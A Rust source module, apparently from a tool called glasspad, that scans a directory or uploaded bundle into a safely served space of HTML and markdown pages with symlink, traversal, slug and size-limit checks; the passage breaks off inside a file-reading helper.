//! The space model — a directory of files becomes a live, safely-served space
//! (Wave 2a / Phase 2). Production, security-sensitive code.
//!
//! A **space** is a directory of artifacts (`.html` served verbatim, and — the
//! markdown-native path — `.md`/`.markdown` rendered server-side through a built-in
//! or producer-supplied fragment template into an artifact body) plus first-class `assets/`.
//! `scan_dir` reads the whole tree into an **immutable in-memory snapshot**;
//! `ArtifactHost` swaps snapshots atomically (a half-written file is never served
//! — reads see either the fully-old or the fully-new snapshot, never a partial
//! one). All of the untrusted-input handling lives here:
//!
//! * **slug grammar** + **reserved-name / collision** hard-error rejection;
//! * **symlink + path-traversal rejection** — every entry is `lstat`-checked and
//!   its canonical path must stay under the space root; assets are matched against
//!   the pre-scanned map (an exact allowlist), so a request path can only ever
//!   retrieve a real, already-vetted file;
//! * **MIME detection** (extension allowlist) with `nosniff`;
//! * **per-file and per-space size limits**;
//! * **title resolution** — parsed (a small tokenizer, not a regex), entity-
//!   decoded, length-bounded; inserted downstream as **text**, never `innerHTML`.
//!
//! See `issues/html-artifact-host-rewrite/{design,plan,wave-plan}.md`.

use std::collections::{BTreeMap, HashSet};
use std::fmt;
use std::io::Read;
use std::path::{Component, Path, PathBuf};
use std::sync::Arc;

use serde::{Deserialize, Serialize};

use super::render::{self, BUILTIN_NAMES};
use super::{RESERVED, valid_name};
pub use glasspad::artifact_host::sanitize::{
    MAX_DESC_CHARS, MAX_TITLE_CHARS, extract_description, resolve_title, sanitize_html_label,
    sanitize_label,
};

/// Per-file byte ceiling. A single artifact/asset larger than this is a hard
/// error — a local dev tool has no business streaming huge blobs, and an
/// unbounded read is a trivial memory-exhaustion foot-gun. Enforced on the
/// **actual bytes read**, not the pre-read `stat` length (which a concurrent
/// write could grow).
pub const MAX_FILE_BYTES: u64 = 8 * 1024 * 1024; // 8 MiB
/// Per-space aggregate ceiling across every artifact + asset.
pub const MAX_SPACE_BYTES: u64 = 64 * 1024 * 1024; // 64 MiB
/// Maximum number of scanned entries (artifacts + assets). Bounds map/CPU blowup
/// from a directory of many tiny files that slips under the byte ceilings.
pub const MAX_ENTRIES: usize = 10_000;
/// Manifest input ceiling before YAML parsing — small, to bound alias-expansion
/// ("billion laughs") blast radius. `glasspad.yaml` is structure-only and tiny.
pub const MAX_MANIFEST_BYTES: u64 = 64 * 1024; // 64 KiB
/// Maximum nav groups a manifest may declare, and the maximum members (incl.
/// nested children) per group. Bounds the grouped-nav structure the shell renders
/// and the landing lists — a manifest is structure-only and small.
pub const MAX_NAV_GROUPS: usize = 64;
pub const MAX_GROUP_MEMBERS: usize = 512;
/// The reserved subdirectory that holds a space's static assets. It is also a
/// reserved *slug* name (see `RESERVED`), so no artifact can collide with it.
pub const ASSETS_DIR: &str = "assets";
/// Optional structure-only manifest filename.
pub const MANIFEST_FILE: &str = "glasspad.yaml";

/// One HTML artifact within a space. `html` is the raw file content served
/// verbatim on the content route (fragment wrapping is Wave 3a). `title` is the
/// resolved, entity-decoded, length-bounded display title.
#[derive(Clone, Debug)]
pub struct Artifact {
    pub html: String,
    pub title: String,
}

/// One static asset addressed by its space-relative path (e.g. `assets/logo.svg`).
#[derive(Clone, Debug)]
pub struct Asset {
    pub content_type: &'static str,
    pub bytes: Vec<u8>,
}

/// One member of a nav group — an artifact slug, with an optional manifest display
/// title override, an optional short description (for the generated landing page),
/// and up to one level of nested companion `children` (e.g. `x-arkkitehdille`
/// nested under `x`). This is **structure only**: `slug` addresses a real artifact,
/// `title`/`desc` are producer metadata (never authored content), and `children`
/// is one level deep — a child's own `children` is dropped at reconciliation.
///
/// **Companion nesting is a manifest-level mapping (the documented choice).**
/// glasspad does NOT accept/normalize the dotted `x.arkkitehdille.md` stems (those
/// stay slug-invalid, and the file-naming *convention* is the producer's
/// preprocessor — explicitly out of scope). Instead the producer ships slug-safe
/// pages (`x`, `x-arkkitehdille`) and declares the parent/child relationship here.
#[derive(Clone, Debug, Default, PartialEq, Serialize, Deserialize)]
pub struct NavMember {
    pub slug: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub title: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub desc: Option<String>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub children: Vec<NavMember>,
}

/// A named, ordered nav group (e.g. "ADR:t", "Suunnitteludokumentit") declared in
/// the manifest. Rendered as a labelled section in the grouped sidebar and on the
/// generated landing page. Structure only — `label` is producer metadata, `members`
/// address real artifact slugs (reconciled against the scanned set in [`finalize`]).
#[derive(Clone, Debug, Default, PartialEq, Serialize, Deserialize)]
pub struct NavGroup {
    pub label: String,
    #[serde(default)]
    pub members: Vec<NavMember>,
}

/// One fully-scanned space. Immutable once built; shared behind an `Arc`.
#[derive(Clone, Debug, Default)]
pub struct Space {
    /// slug → artifact, ordered lexicographically (the fallback nav order).
    pub artifacts: BTreeMap<String, Artifact>,
    /// space-relative path → asset (e.g. `assets/data.json`).
    pub assets: BTreeMap<String, Asset>,
    /// Ordered slugs for navigation (manifest `nav:` order, else lexicographic).
    /// Always the complete slug set — the shell's low-authority allowlist — even
    /// when [`nav_groups`](Self::nav_groups) curates a grouped subset for display.
    pub nav: Vec<String>,
    /// Optional grouped, one-level-nestable nav declared via the manifest `groups:`
    /// key, reconciled against the real artifact set. **Empty → today's flat nav**
    /// (byte-compatible fallback): the shell renders the horizontal `nav` bar and no
    /// grouped sidebar. Non-empty → the shell renders a grouped sidebar and the
    /// generated landing lists these groups.
    pub nav_groups: Vec<NavGroup>,
    /// Resolved home slug (`index` > `home` > first in nav order).
    pub home: Option<String>,
    /// Optional space title from the manifest (structure, never content).
    pub title: Option<String>,
    /// Optional emoji favicon for this space's OUTER document (`.glasspad.yaml`
    /// `favicon:`). Already validated ([`crate::favicon::validate`]) wherever it is
    /// set; `None` → the built-in default is rendered. Never derived from artifact
    /// files — it is repo/producer metadata, so the scanner leaves it `None`.
    pub favicon: Option<String>,
}

impl Space {
    pub fn artifact(&self, slug: &str) -> Option<&Artifact> {
        self.artifacts.get(slug)
    }
    pub fn asset(&self, rel_path: &str) -> Option<&Asset> {
        self.assets.get(rel_path)
    }
    pub fn slugs(&self) -> Vec<String> {
        self.nav.clone()
    }
}

/// An immutable set of spaces. Swapped atomically on rescan.
#[derive(Clone, Debug, Default)]
pub struct Snapshot {
    pub spaces: BTreeMap<String, Arc<Space>>,
}

impl Snapshot {
    pub fn empty() -> Self {
        Self::default()
    }
    pub fn space(&self, name: &str) -> Option<&Space> {
        self.spaces.get(name).map(Arc::as_ref)
    }
}

/// Everything that can go wrong while scanning a directory into a space. Each
/// variant renders an **informative** message (AI-first CLI contract).
#[derive(Debug)]
pub enum ScanError {
    NotADir(PathBuf),
    BadSpaceName(String),
    Io(PathBuf, std::io::Error),
    Symlink(PathBuf),
    Escapes(PathBuf),
    ReservedSlug(String, PathBuf),
    BadSlug(String, PathBuf),
    DuplicateSlug(String, PathBuf),
    FileTooLarge(PathBuf, u64),
    SpaceTooLarge(u64),
    TooManyEntries(usize),
    UnsupportedFileType(PathBuf),
    ManifestTooLarge(PathBuf, u64),
    NotUtf8(PathBuf),
    BadAssetName(PathBuf),
    Manifest(PathBuf, String),
    /// The manifest's `template:` named neither a built-in nor a path-like custom
    /// template reference.
    UnknownTemplate(String),
    /// A custom template path named by the manifest does not exist.
    TemplateNotFound(PathBuf),
    /// A custom template path is not a safe path relative to the space root.
    TemplatePath(String),
    /// A custom template must be a fragment so the host retains wrapping, bridge,
    /// theme, and trusted shell behaviour.
    TemplateFullDocument(PathBuf),
    /// Rendering a `.md` page through its template produced a body over the
    /// per-file cap (markup can amplify a small markdown source).
    RenderTooLarge(PathBuf, u64),
    /// The resolved template could not splice the rendered markdown (a template
    /// missing / duplicating its `{{content}}` slot). Built-in templates never hit
    /// this; the variant keeps the render seam's error surfaced rather than panicked.
    TemplateRender(PathBuf, String),
}

impl fmt::Display for ScanError {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            ScanError::NotADir(p) => write!(f, "not a directory: {}", p.display()),
            ScanError::BadSpaceName(n) => write!(
                f,
                "invalid space name {n:?}: must be lowercase [a-z0-9-], start alphanumeric, \
                 ≤64 chars, and not a reserved name ({})",
                RESERVED.join(", ")
            ),
            ScanError::Io(p, e) => write!(f, "cannot read {}: {e}", p.display()),
            ScanError::Symlink(p) => write!(
                f,
                "refusing to serve symlink {} (symlinks are rejected: they can point outside the space)",
                p.display()
            ),
            ScanError::Escapes(p) => write!(
                f,
                "refusing {}: resolves outside the space root (path traversal)",
                p.display()
            ),
            ScanError::ReservedSlug(s, p) => write!(
                f,
                "reserved slug {s:?} ({}): the names {} are reserved and cannot be artifact slugs",
                p.display(),
                RESERVED.join(", ")
            ),
            ScanError::BadSlug(s, p) => write!(
                f,
                "invalid slug {s:?} ({}): a slug (filename stem) must be lowercase [a-z0-9-], \
                 start alphanumeric, and be ≤64 chars",
                p.display()
            ),
            ScanError::DuplicateSlug(s, p) => write!(
                f,
                "duplicate slug {s:?} ({}): two files map to the same slug — rename one \
                 (collisions are never silently resolved)",
                p.display()
            ),
            ScanError::FileTooLarge(p, n) => write!(
                f,
                "{} is {n} bytes, over the {MAX_FILE_BYTES}-byte per-file limit",
                p.display()
            ),
            ScanError::SpaceTooLarge(n) => write!(
                f,
                "space totals {n} bytes, over the {MAX_SPACE_BYTES}-byte per-space limit"
            ),
            ScanError::TooManyEntries(n) => write!(
                f,
                "space has more than {MAX_ENTRIES} files (counted {n}); split it or prune assets"
            ),
            ScanError::UnsupportedFileType(p) => write!(
                f,
                "{} is not a regular file (FIFOs, sockets, and devices are not servable)",
                p.display()
            ),
            ScanError::ManifestTooLarge(p, n) => write!(
                f,
                "{} is {n} bytes, over the {MAX_MANIFEST_BYTES}-byte manifest limit",
                p.display()
            ),
            ScanError::NotUtf8(p) => write!(
                f,
                "{} is not valid UTF-8 (artifacts must be UTF-8 HTML)",
                p.display()
            ),
            ScanError::BadAssetName(p) => write!(
                f,
                "invalid asset path {}: each segment must be [A-Za-z0-9._-], no '.'/'..'/empty segments",
                p.display()
            ),
            ScanError::Manifest(p, e) => write!(f, "cannot parse {}: {e}", p.display()),
            ScanError::UnknownTemplate(name) => write!(
                f,
                "unknown template {name:?} in {MANIFEST_FILE}: expected a built-in ({}) or a \
                 relative path to a template file (for example `templates/brand.html`)",
                BUILTIN_NAMES.join(", ")
            ),
            ScanError::TemplateNotFound(path) => write!(
                f,
                "custom template {} does not exist: set `template:` to a readable file relative \
                 to the space root",
                path.display()
            ),
            ScanError::TemplatePath(path) => write!(
                f,
                "invalid custom template path {path:?}: it must be a relative path inside the \
                 space (no `..`, absolute paths, or symlinks)"
            ),
            ScanError::TemplateFullDocument(path) => write!(
                f,
                "custom template {} is a full HTML document: space templates must be fragments \
                 so glasspad can retain its theme, navigation bridge, and trusted shell",
                path.display()
            ),
            ScanError::RenderTooLarge(p, n) => write!(
                f,
                "rendering {} produced {n} bytes, over the {MAX_FILE_BYTES}-byte per-file limit \
                 (markdown can amplify into much larger markup)",
                p.display()
            ),
            ScanError::TemplateRender(p, e) => {
                write!(f, "cannot render {}: {e}", p.display())
            }
        }
    }
}

impl std::error::Error for ScanError {}

// --- in-memory space bundle (hosted space ingest, Gap 1) -------------------

/// One page in an ingest **bundle** — an already-final HTML artifact body plus its
/// slug (filename stem). The hosted space-ingest surface (`POST /api/v1/spaces`)
/// carries these instead of a directory; [`build_space_bundle`] validates them with
/// the **same** rules the filesystem scanner ([`scan_dir`]) applies, so the
/// security-sensitive checks have one implementation exercised from both paths.
#[derive(Clone, Debug)]
pub struct BundlePage {
    pub slug: String,
    pub html: String,
}

/// One static asset in an ingest bundle. `path` is the space-relative path *under*
/// `assets/` (e.g. `logo.svg` or `sub/logo.svg`), **without** the `assets/` prefix —
/// exactly the shape the request `{*path}` and `asset_key_for_request` use.
#[derive(Clone, Debug)]
pub struct BundleAsset {
    pub path: String,
    pub bytes: Vec<u8>,
}

/// Everything that can go wrong assembling an in-memory bundle into a `Space`.
/// Distinct from [`ScanError`] (which is path-oriented) but enforces the identical
/// grammar/cap/reserved rules; each renders an informative message (AI-first §10).
#[derive(Debug)]
pub enum BundleError {
    Empty,
    ReservedSlug(String),
    BadSlug(String),
    DuplicateSlug(String),
    BadAssetPath(String),
    DuplicateAsset(String),
    FileTooLarge(String, u64),
    SpaceTooLarge(u64),
    TooManyEntries(usize),
}

impl fmt::Display for BundleError {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            BundleError::Empty => write!(f, "a space must contain at least one page"),
            BundleError::ReservedSlug(s) => write!(
                f,
                "reserved slug {s:?}: the names {} are reserved and cannot be page slugs",
                RESERVED.join(", ")
            ),
            BundleError::BadSlug(s) => write!(
                f,
                "invalid slug {s:?}: a page slug must be lowercase [a-z0-9-], start alphanumeric, \
                 and be ≤64 chars"
            ),
            BundleError::DuplicateSlug(s) => write!(
                f,
                "duplicate slug {s:?}: two pages map to the same slug — rename one"
            ),
            BundleError::BadAssetPath(p) => write!(
                f,
                "invalid asset path {p:?}: each segment must be [A-Za-z0-9._-], no '.'/'..'/empty \
                 segments, and no leading 'assets/'"
            ),
            BundleError::DuplicateAsset(p) => {
                write!(
                    f,
                    "duplicate asset path {p:?}: two assets map to the same key"
                )
            }
            BundleError::FileTooLarge(name, n) => write!(
                f,
                "{name} is {n} bytes, over the {MAX_FILE_BYTES}-byte per-file limit"
            ),
            BundleError::SpaceTooLarge(n) => write!(
                f,
                "space totals {n} bytes, over the {MAX_SPACE_BYTES}-byte per-space limit"
            ),
            BundleError::TooManyEntries(n) => write!(
                f,
                "space has more than {MAX_ENTRIES} entries (counted {n}); split it or prune assets"
            ),
        }
    }
}

impl std::error::Error for BundleError {}

/// Assemble a validated multi-artifact [`Space`] from an in-memory bundle (hosted
/// space ingest). Applies the **same** untrusted-input rules as [`scan_dir`]: slug
/// grammar + reserved-name + collision rejection, per-file and per-space byte caps,
/// entry-count cap, asset-path grammar + collision rejection, per-artifact title
/// resolution, and nav/home finalization. The caller (`hosted::ingest`) has already
/// bounded the request body; this is the authoritative content validation regardless
/// of what the client claims. Never touches the filesystem, so there is no symlink /
/// traversal surface here — the asset *key* grammar is still enforced so a stored key
/// can never contain a traversal token.
pub fn build_space_bundle(
    pages: Vec<BundlePage>,
    assets: Vec<BundleAsset>,
    nav: Vec<String>,
    nav_groups: Vec<NavGroup>,
    title: Option<String>,
) -> Result<Space, BundleError> {
    if pages.is_empty() {
        return Err(BundleError::Empty);
    }
    let total_entries = pages.len() + assets.len();
    if total_entries > MAX_ENTRIES {
        return Err(BundleError::TooManyEntries(total_entries));
    }

    let mut space = Space::default();
    let mut total: u64 = 0;

    for page in pages {
        let BundlePage { slug, html } = page;
        if RESERVED.contains(&slug.as_str()) {
            return Err(BundleError::ReservedSlug(slug));
        }
        if !valid_name(&slug) {
            return Err(BundleError::BadSlug(slug));
        }
        if space.artifacts.contains_key(&slug) {
            return Err(BundleError::DuplicateSlug(slug));
        }
        let len = html.len() as u64;
        if len > MAX_FILE_BYTES {
            return Err(BundleError::FileTooLarge(format!("page {slug}"), len));
        }
        total = total.saturating_add(len);
        if total > MAX_SPACE_BYTES {
            return Err(BundleError::SpaceTooLarge(total));
        }
        let title = resolve_title(&html).unwrap_or_else(|| slug.clone());
        space.artifacts.insert(slug, Artifact { html, title });
    }

    for asset in assets {
        let BundleAsset { path, bytes } = asset;
        let key = bundle_asset_key(&path).ok_or_else(|| BundleError::BadAssetPath(path.clone()))?;
        if space.assets.contains_key(&key) {
            return Err(BundleError::DuplicateAsset(path));
        }
        let len = bytes.len() as u64;
        if len > MAX_FILE_BYTES {
            return Err(BundleError::FileTooLarge(format!("asset {path}"), len));
        }
        total = total.saturating_add(len);
        if total > MAX_SPACE_BYTES {
            return Err(BundleError::SpaceTooLarge(total));
        }
        let content_type = mime_for(Path::new(&key));
        space.assets.insert(
            key,
            Asset {
                content_type,
                bytes,
            },
        );
    }

    // Space title (from the producer's manifest) — sanitized exactly like the
    // filesystem manifest path: entity-decoded, spoof-char-stripped, length-bounded.
    if let Some(t) = title {
        space.title = sanitize_html_label(&t, MAX_TITLE_CHARS);
    }
    // Record the requested nav order + grouped nav; `finalize` reconciles both
    // against reality (keeps only existing slugs, dedups, appends the rest
    // lexicographically), generates the landing when there is no home page, and
    // resolves the home slug (`index` > `home` > first in nav order).
    space.nav = nav;
    space.nav_groups = nav_groups;
    finalize(&mut space, total);
    Ok(space)
}

/// Validate a bundle asset path into its stored key (`assets/<segs...>`). Mirrors
/// [`asset_key_for_request`] (same per-segment grammar), but rejects a leading
/// `assets/` component so the caller passes the path *relative to* `assets/`, and a
/// key can never itself contain a traversal token.
fn bundle_asset_key(path: &str) -> Option<String> {
    if path.is_empty() {
        return None;
    }
    let mut segs = vec![ASSETS_DIR.to_string()];
    for (i, seg) in path.split('/').enumerate() {
        if !valid_asset_segment(seg) {
            return None;
        }
        // Reject a redundant leading `assets/` (the caller passes paths relative to
        // the assets dir); a deeper segment literally named "assets" is fine.
        if i == 0 && seg == ASSETS_DIR {
            return None;
        }
        segs.push(seg.to_string());
    }
    Some(segs.join("/"))
}

/// Derive a space name from a directory path (its final component) and validate
/// it against the space grammar + reserved list.
pub fn space_name_for(dir: &Path) -> Result<String, ScanError> {
    let name = dir
        .file_name()
        .and_then(|n| n.to_str())
        .map(|s| s.to_string())
        .ok_or_else(|| ScanError::BadSpaceName(dir.display().to_string()))?;
    if !super::valid_space(&name) {
        return Err(ScanError::BadSpaceName(name));
    }
    Ok(name)
}

/// Scan a single directory into a `Space`. All-or-nothing: on any rejected entry
/// this returns `Err` and no partial space is produced (the caller keeps serving
/// the previous snapshot). Never follows symlinks; never escapes `root`.
pub fn scan_dir(root: &Path) -> Result<Space, ScanError> {
    let root = root.to_path_buf();
    let meta = std::fs::symlink_metadata(&root).map_err(|e| ScanError::Io(root.clone(), e))?;
    if meta.file_type().is_symlink() {
        return Err(ScanError::Symlink(root));
    }
    if !meta.is_dir() {
        return Err(ScanError::NotADir(root));
    }
    // Canonical root: every accepted file's canonical path must stay under it.
    let canon_root = std::fs::canonicalize(&root).map_err(|e| ScanError::Io(root.clone(), e))?;

    let mut space = Space::default();
    let mut total: u64 = 0;
    // The manifest's `template:` (built-in name or producer file), resolved once
    // after the scan so a `.md` file that sorts before `glasspad.yaml` still renders
    // with the chosen template. `None` → the `prose` default.
    let mut template_ref: Option<String> = None;
    // `.md`/`.markdown` pages are buffered raw during the scan and rendered *after*
    // the whole directory is read — so the template (from the manifest, which may
    // appear anywhere in sort order) is known, and a `.md`↔`.html` stem collision is
    // detected against the fully-populated `.html` artifact set.
    let mut pending_md: Vec<(String, String, PathBuf)> = Vec::new();

    // --- top-level entries: *.html artifacts, assets/ dir, manifest ---------
    let mut entries: Vec<_> = std::fs::read_dir(&root)
        .map_err(|e| ScanError::Io(root.clone(), e))?
        .collect::<Result<Vec<_>, _>>()
        .map_err(|e| ScanError::Io(root.clone(), e))?;
    // Deterministic order so slug-collision / "first wins" decisions are stable.
    entries.sort_by_key(|e| e.file_name());

    for entry in &entries {
        let path = entry.path();
        let ftype = entry
            .file_type()
            .map_err(|e| ScanError::Io(path.clone(), e))?;
        if ftype.is_symlink() {
            return Err(ScanError::Symlink(path));
        }
        let name = entry.file_name();
        let name = name
            .to_str()
            .ok_or_else(|| ScanError::BadAssetName(path.clone()))?;

        if ftype.is_dir() {
            if name == ASSETS_DIR {
                scan_assets(&path, &canon_root, &mut space, &mut total)?;
            }
            // Any other subdirectory is ignored (only assets/ is served).
            continue;
        }

        if name == MANIFEST_FILE {
            // Bound the manifest tightly (stat first, then verify actual bytes) so
            // an alias-bomb never reaches the YAML parser.
            if ftype.is_file() && entry_len(&path) > MAX_MANIFEST_BYTES {
                return Err(ScanError::ManifestTooLarge(path.clone(), entry_len(&path)));
            }
            let raw = read_file_capped(&path, &mut total)?;
            if raw.len() as u64 > MAX_MANIFEST_BYTES {
                return Err(ScanError::ManifestTooLarge(path.clone(), raw.len() as u64));
            }
            let text = String::from_utf8(raw).map_err(|_| ScanError::NotUtf8(path.clone()))?;
            apply_manifest(&text, &path, &mut space, &mut template_ref)?;
            continue;
        }

        // Markdown pages: buffer the raw source now, render after the scan (slug =
        // filename stem). Grammar/reserved are checked here (cheap, early); the
        // collision + entry-cap + render happen post-loop once every `.html` slug and
        // the template are known.
        if let Some(stem) = md_stem(name) {
            if RESERVED.contains(&stem) {
                return Err(ScanError::ReservedSlug(stem.to_string(), path.clone()));
            }
            if !valid_name(stem) {
                return Err(ScanError::BadSlug(stem.to_string(), path.clone()));
            }
            if space.artifacts.len() + space.assets.len() + pending_md.len() >= MAX_ENTRIES {
                return Err(ScanError::TooManyEntries(
                    space.artifacts.len() + space.assets.len() + pending_md.len() + 1,
                ));
            }
            ensure_within(&canon_root, &path)?;
            let raw = read_file_capped(&path, &mut total)?;
            let md = String::from_utf8(raw).map_err(|_| ScanError::NotUtf8(path.clone()))?;
            pending_md.push((stem.to_string(), md, path.clone()));
            continue;
        }

        // Artifacts are top-level *.html files. Slug = filename stem, literally.
        if let Some(stem) = html_stem(name) {
            if RESERVED.contains(&stem) {
                return Err(ScanError::ReservedSlug(stem.to_string(), path.clone()));
            }
            if !valid_name(stem) {
                return Err(ScanError::BadSlug(stem.to_string(), path.clone()));
            }
            if space.artifacts.contains_key(stem) {
                return Err(ScanError::DuplicateSlug(stem.to_string(), path.clone()));
            }
            if space.artifacts.len() + space.assets.len() >= MAX_ENTRIES {
                return Err(ScanError::TooManyEntries(
                    space.artifacts.len() + space.assets.len() + 1,
                ));
            }
            ensure_within(&canon_root, &path)?;
            let raw = read_file_capped(&path, &mut total)?;
            let html = String::from_utf8(raw).map_err(|_| ScanError::NotUtf8(path.clone()))?;
            let title = resolve_title(&html).unwrap_or_else(|| stem.to_string());
            space
                .artifacts
                .insert(stem.to_string(), Artifact { html, title });
        }
        // Non-.html/.md, non-manifest top-level files are ignored (assets live in assets/).
    }

    // Resolve + validate the template selection **unconditionally** — a mistyped
    // `template:` in `glasspad.yaml` is a config error that must fail fast, not lie
    // dormant until the first `.md` page is added to an otherwise `.html`-only space.
    let template = resolve_space_template(template_ref.as_deref(), &root, &canon_root, &mut total)?;

    // --- render buffered markdown pages through the resolved template -------
    // The template is always a fragment: built-in (`prose` default or `dashboard`)
    // or a producer file buffered into this snapshot. The rendered body flows through
    // the SAME serve path as an `.html` artifact: the content route sets the frozen
    // CSP/sandbox headers and `wrap::render_artifact` adds base.css + bridge.js.
    for (stem, md, path) in pending_md {
        // Collision against an `.html` artifact of the same stem, or another `.md`
        // page — never silently resolved (mirrors the `.html`/`.htm` collision).
        if space.artifacts.contains_key(&stem) {
            return Err(ScanError::DuplicateSlug(stem, path));
        }
        let body = if template.is_custom {
            render::render_space_template_to_body(&md, &template.source)
        } else {
            render::render_to_body(&md, &template.source)
        }
        .map_err(|e| ScanError::TemplateRender(path.clone(), e.to_string()))?;
        let len = body.len() as u64;
        if len > MAX_FILE_BYTES {
            return Err(ScanError::RenderTooLarge(path, len));
        }
        // Re-account the per-space byte budget on the RENDERED body, not the source:
        // `read_file_capped` charged the `.md` source bytes, but the immutable `Space`
        // retains and serves the (potentially amplified) rendered HTML. Swap
        // source→rendered in `total` and re-check the aggregate cap **inside** the loop
        // so an over-budget space aborts before rendering the rest into memory.
        total = total.saturating_sub(md.len() as u64).saturating_add(len);
        if total > MAX_SPACE_BYTES {
            return Err(ScanError::SpaceTooLarge(total));
        }
        let title = resolve_title(&body).unwrap_or_else(|| stem.clone());
        space.artifacts.insert(stem, Artifact { html: body, title });
    }

    if total > MAX_SPACE_BYTES {
        return Err(ScanError::SpaceTooLarge(total));
    }
    // Authoritative entry-count cap on the FINAL snapshot: the per-entry checks during
    // the scan run against partially-populated maps (assets are scanned before buffered
    // `.md` pages are inserted), so a directory could otherwise overshoot by the md
    // count. This final check makes `MAX_ENTRIES` hold regardless of scan order.
    let entries = space.artifacts.len() + space.assets.len();
    if entries > MAX_ENTRIES {
        return Err(ScanError::TooManyEntries(entries));
    }

    finalize(&mut space, total);
    Ok(space)
}

/// A resolved space template. Custom template bytes are read during scanning, so a
/// published space contains only rendered artifact bodies and never needs the local
/// producer path at serve time.
struct SpaceTemplate {
    source: String,
    is_custom: bool,
}

/// Resolve a markdown-native space's `template:`. Built-in names remain names;
/// anything path-like (as in the single-file `--template` contract) is read from a
/// regular, UTF-8, non-symlink file relative to this space root.
fn resolve_space_template(
    reference: Option<&str>,
    root: &Path,
    canon_root: &Path,
    _total: &mut u64,
) -> Result<SpaceTemplate, ScanError> {
    let name = reference.unwrap_or(render::DEFAULT_TEMPLATE);
    if let Some(source) = render::builtin_template(name) {
        return Ok(SpaceTemplate {
            source: source.to_string(),
            is_custom: false,
        });
    }
    // Match the single-file resolver's useful distinction: bare unknown names are
    // probably typos in a built-in; a dot or slash means an intended file reference.
    if !name.contains('.') && !name.contains('/') {
        return Err(ScanError::UnknownTemplate(name.to_string()));
    }
    let rel = Path::new(name);
    let mut clean = PathBuf::new();
    for component in rel.components() {
        match component {
            Component::CurDir => {}
            Component::Normal(part) => clean.push(part),
            Component::ParentDir | Component::RootDir | Component::Prefix(_) => {
                return Err(ScanError::TemplatePath(name.to_string()));
            }
        }
    }
    if clean.as_os_str().is_empty() {
        return Err(ScanError::TemplatePath(name.to_string()));
    }
    let path = root.join(&clean);
    if !path.exists() {
        return Err(ScanError::TemplateNotFound(path));
    }
    // `canonicalize` containment alone would allow an in-root symlink. Space inputs
    // reject every symlink, including a template's ancestor directories.
    let mut walked = root.to_path_buf();
    for component in clean.components() {
        walked.push(component);
        if std::fs::symlink_metadata(&walked)
            .map_err(|e| ScanError::Io(walked.clone(), e))?
            .file_type()
            .is_symlink()
        {
            return Err(ScanError::Symlink(walked));
        }
    }
    ensure_within(canon_root, &path)?;
    // The template is an input, not a served snapshot entry. Bound it to the normal
    // per-file ceiling without borrowing the nearly-full snapshot's remaining byte
    // budget: its bytes will instead be represented in every rendered page body.
    let mut template_total = 0;
    let raw = read_file_capped(&path, &mut template_total)?;
    let source = String::from_utf8(raw).map_err(|_| ScanError::NotUtf8(path.clone()))?;
    if !super::wrap::is_fragment(&source) {
        return Err(ScanError::TemplateFullDocument(path));
    }
    Ok(SpaceTemplate {
        source,
        is_custom: true,
    })
}

/// Recursively scan the `assets/` subtree into `space.assets`, keyed by the
/// space-relative path (`assets/...`). Rejects symlinks and any path that
/// escapes the canonical root.
fn scan_assets(
    dir: &Path,
    canon_root: &Path,
    space: &mut Space,
    total: &mut u64,
) -> Result<(), ScanError> {
    let mut stack = vec![dir.to_path_buf()];
    while let Some(cur) = stack.pop() {
        let mut entries: Vec<_> = std::fs::read_dir(&cur)
            .map_err(|e| ScanError::Io(cur.clone(), e))?
            .collect::<Result<Vec<_>, _>>()
            .map_err(|e| ScanError::Io(cur.clone(), e))?;
        entries.sort_by_key(|e| e.file_name());
        for entry in &entries {
            let path = entry.path();
            let ftype = entry
                .file_type()
                .map_err(|e| ScanError::Io(path.clone(), e))?;
            if ftype.is_symlink() {
                return Err(ScanError::Symlink(path));
            }
            if ftype.is_dir() {
                stack.push(path);
                continue;
            }
            if !ftype.is_file() {
                // FIFOs, sockets, devices — not servable content.
                return Err(ScanError::UnsupportedFileType(path));
            }
            if space.artifacts.len() + space.assets.len() >= MAX_ENTRIES {
                return Err(ScanError::TooManyEntries(
                    space.artifacts.len() + space.assets.len() + 1,
                ));
            }
            ensure_within(canon_root, &path)?;
            let rel = rel_key(canon_root, &path)?;
            let bytes = read_file_capped(&path, total)?;
            space.assets.insert(
                rel,
                Asset {
                    content_type: mime_for(&path),
                    bytes,
                },
            );
        }
    }
    Ok(())
}

/// Compute the space-relative key (`assets/...`) for a file, validating every
/// segment against the asset-name grammar so a stored key can never itself
/// contain a traversal token.
fn rel_key(canon_root: &Path, path: &Path) -> Result<String, ScanError> {
    let canon = std::fs::canonicalize(path).map_err(|e| ScanError::Io(path.to_path_buf(), e))?;
    let rel = canon
        .strip_prefix(canon_root)
        .map_err(|_| ScanError::Escapes(path.to_path_buf()))?;
    let mut segs = Vec::new();
    for comp in rel.components() {
        match comp {
            Component::Normal(os) => {
                let s = os
                    .to_str()
                    .ok_or_else(|| ScanError::BadAssetName(path.to_path_buf()))?;
                if !valid_asset_segment(s) {
                    return Err(ScanError::BadAssetName(path.to_path_buf()));
                }
                segs.push(s.to_string());
            }
            // Canonicalization removes `.`/`..`; anything else here is anomalous.
            _ => return Err(ScanError::BadAssetName(path.to_path_buf())),
        }
    }
    Ok(segs.join("/"))
}

/// Best-effort file length via `lstat` (0 if it can't be read — the subsequent
/// capped read is the real enforcement).
fn entry_len(path: &Path) -> u64 {
    std::fs::symlink_metadata(path)
        .map(|m| m.len())
        .unwrap_or(0)
}

/// Assert a path's canonical form is contained within the canonical root. Defends
/// against a symlink or `..` component slipping a file outside the space.
fn ensure_within(canon_root: &Path, path: &Path) -> Result<(), ScanError> {
    let canon = std::fs::canonicalize(path).map_err(|e| ScanError::Io(path.to_path_buf(), e))?;
    if canon.strip_prefix(canon_root).is_err() {
        return Err(ScanError::Escapes(path.to_path_buf()));
    }
    Ok(())
}

/// Read a file, enforcing the per-file cap on the **actual bytes read** (not a
/// pre-read `stat`, which a concurrent write could grow), accumulating the real
/// per-space total, and rejecting anything that isn't a regular file. Rejecting
/// non-regular files by `lstat` **before** opening is what keeps a FIFO named
/// `index.html` from blocking the scan forever (opening a FIFO blocks).
fn read_file_capped(path: &Path, total: &mut u64) -> Result<Vec<u8>, ScanError> {
    let meta = std::fs::symlink_metadata(path).map_err(|e| ScanError::Io(path.to_path_buf(), e))?;
